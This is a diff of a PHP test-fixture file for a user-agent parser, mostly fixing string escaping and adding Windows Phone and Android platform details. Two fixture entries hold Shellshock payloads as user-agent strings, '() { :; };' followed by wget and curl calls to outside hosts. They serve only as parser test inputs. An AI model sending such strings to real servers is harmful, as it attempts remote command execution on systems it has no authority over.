@@ -1490,7 +1490,7 @@ return [
         ],
     ],
     'test-0003-71' => [
-        'ua'         => '() { :; }; /bin/sh -c \'wget http://redlug.com/pdf/IWD1990.docx -O /dev/null;wget1 http://redlug.com/pdf/IWD1990.docx -O /dev/null;curl http://redlug.com/pdf/IWD1990.docx -o /dev/null;/usr/sfwbin/wget http://redlug.com/pdf/IWD1990.docx;fetch -/dev/null http://redlug.com/pdf/IWD1990.docx\'',
+        'ua'         => '() { :; }; /bin/sh -c \\'wget http://redlug.com/pdf/IWD1990.docx -O /dev/null;wget1 http://redlug.com/pdf/IWD1990.docx -O /dev/null;curl http://redlug.com/pdf/IWD1990.docx -o /dev/null;/usr/sfwbin/wget http://redlug.com/pdf/IWD1990.docx;fetch -/dev/null http://redlug.com/pdf/IWD1990.docx\\'',
         'properties' => [
             'Browser_Name'            => 'Default Browser',
             'Browser_Type'            => 'unknown',
@@ -18002,7 +18002,7 @@ return [
         ],
     ],
     'test-0003-881' => [
-        'ua'         => 'Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; Doris D\xc3\xb6rfler; rv:11.0) like Gecko',
+        'ua'         => 'Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; Doris D\\xc3\\xb6rfler; rv:11.0) like Gecko',
         'properties' => [
             'Browser_Name'            => 'Default Browser',
             'Browser_Type'            => 'unknown',
@@ -18515,6 +18515,9 @@ return [
             'Browser_Modus'           => 'unknown',
             'Browser_Version'         => '0.0',
             'Platform_Name'           => 'Windows Phone OS',
+            'Platform_Version'        => '8.1.0',
+            'Platform_Bits'           => 32,
+            'Platform_Maker'          => 'Microsoft Corporation',
             'Device_Name'             => 'unknown',
             'Device_Maker'            => 'unknown',
             'Device_Type'             => 'unknown',
@@ -18656,6 +18659,9 @@ return [
             'Browser_Modus'           => 'unknown',
             'Browser_Version'         => '0.0',
             'Platform_Name'           => 'Windows Phone OS',
+            'Platform_Version'        => '8.1.0',
+            'Platform_Bits'           => 32,
+            'Platform_Maker'          => 'Microsoft Corporation',
             'Device_Name'             => 'unknown',
             'Device_Maker'            => 'unknown',
             'Device_Type'             => 'unknown',
@@ -18677,7 +18683,7 @@ return [
             'Browser_Modus'           => 'unknown',
             'Browser_Version'         => '50.0',
             'Platform_Name'           => 'Android',
-            'Platform_Version'        => '4.4',
+            'Platform_Version'        => '4.4.2',
             'Platform_Bits'           => 32,
             'Platform_Maker'          => 'Google Inc',
             'Device_Name'             => 'unknown',
@@ -19556,7 +19562,7 @@ return [
         ],
     ],
     'test-0003-960' => [
-        'ua'         => 'docker/1.11.1 go/go1.5.4 git-commit/5604cbe kernel/4.4.0-21-generic os/linux arch/amd64 UpstreamClient(Docker-Client/1.11.1 \(linux\))',
+        'ua'         => 'docker/1.11.1 go/go1.5.4 git-commit/5604cbe kernel/4.4.0-21-generic os/linux arch/amd64 UpstreamClient(Docker-Client/1.11.1 \\(linux\\))',
         'properties' => [
             'Browser_Name'            => 'Default Browser',
             'Browser_Type'            => 'unknown',
@@ -28916,7 +28922,7 @@ return [
         ],
     ],
     'test-0003-1428' => [
-        'ua'         => '() { :; }; /bin/sh -c \'wget http://www.chaparral300.com/src/image/marioarrow.gif -O /dev/null;wget1 http://www.chaparral300.com/src/image/marioarrow.gif -O /dev/null;curl http://www.chaparral300.com/src/image/marioarrow.gif -o /dev/null;/usr/sfwbin/wget http://www.chaparral300.com/src/image/marioarrow.gif -O /dev/null;fetch -/dev/null http://www.chaparral300.com/src/image/marioarrow.gif\'',
+        'ua'         => '() { :; }; /bin/sh -c \\'wget http://www.chaparral300.com/src/image/marioarrow.gif -O /dev/null;wget1 http://www.chaparral300.com/src/image/marioarrow.gif -O /dev/null;curl http://www.chaparral300.com/src/image/marioarrow.gif -o /dev/null;/usr/sfwbin/wget http://www.chaparral300.com/src/image/marioarrow.gif -O /dev/null;fetch -/dev/null http://www.chaparral300.com/src/image/marioarrow.gif\\'',
         'properties' => [
             'Browser_Name'            => 'Default Browser',
             'Browser_Type'            => 'unknown',
@@ -39509,7 +39515,7 @@ return [
             'Browser_Modus'           => 'unknown',
             'Browser_Version'         => '50.0',
             'Platform_Name'           => 'Android',
-            'Platform_Version'        => '4.4',
+            'Platform_Version'        => '4.4.2',
             'Platform_Bits'           => 32,
             'Platform_Maker'          => 'Google Inc',
             'Device_Name'             => 'unknown',
